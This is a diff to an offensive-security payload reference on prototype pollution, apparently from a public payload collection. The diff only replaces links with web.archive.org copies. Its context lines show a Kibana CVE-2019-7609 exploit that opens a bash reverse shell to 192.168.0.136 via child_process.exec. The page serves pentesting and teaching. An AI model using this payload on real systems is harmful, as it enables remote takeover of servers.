@@ -123,14 +123,14 @@ https://www.apple.com/shop/buy-watch/apple-watch?a[constructor][prototype]=image
 
 Depending if the prototype pollution is executed client (CSPP) or server side (SSPP), the impact will vary.
 
-* Remote Command Execution: [RCE in Kibana (CVE-2019-7609)](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
+* Remote Command Execution: [RCE in Kibana (CVE-2019-7609)](https://web.archive.org/web/20191031042307/https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
 
     ```js
     .es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//')
     .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
     ```
 
-* Remote Command Execution: [RCE using EJS gadgets](https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce)
+* Remote Command Execution: [RCE using EJS gadgets](https://web.archive.org/web/20230309172121/https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce)
 
     ```js
     {
@@ -141,8 +141,8 @@ Depending if the prototype pollution is executed client (CSPP) or server side (S
     }
     ```
 
-* Reflected XSS: [Reflected XSS on www.hackerone.com via Wistia embed code - #986386](https://hackerone.com/reports/986386)
-* Client-side bypass: [Prototype pollution – and bypassing client-side HTML sanitizers](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)
+* Reflected XSS: [Reflected XSS on www.hackerone.com via Wistia embed code - #986386](https://web.archive.org/web/20200928082422/https://hackerone.com/reports/986386)
+* Client-side bypass: [Prototype pollution – and bypassing client-side HTML sanitizers](https://web.archive.org/web/20200908002825/https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)
 * Denial of Service
 
 ### Prototype Pollution Payloads
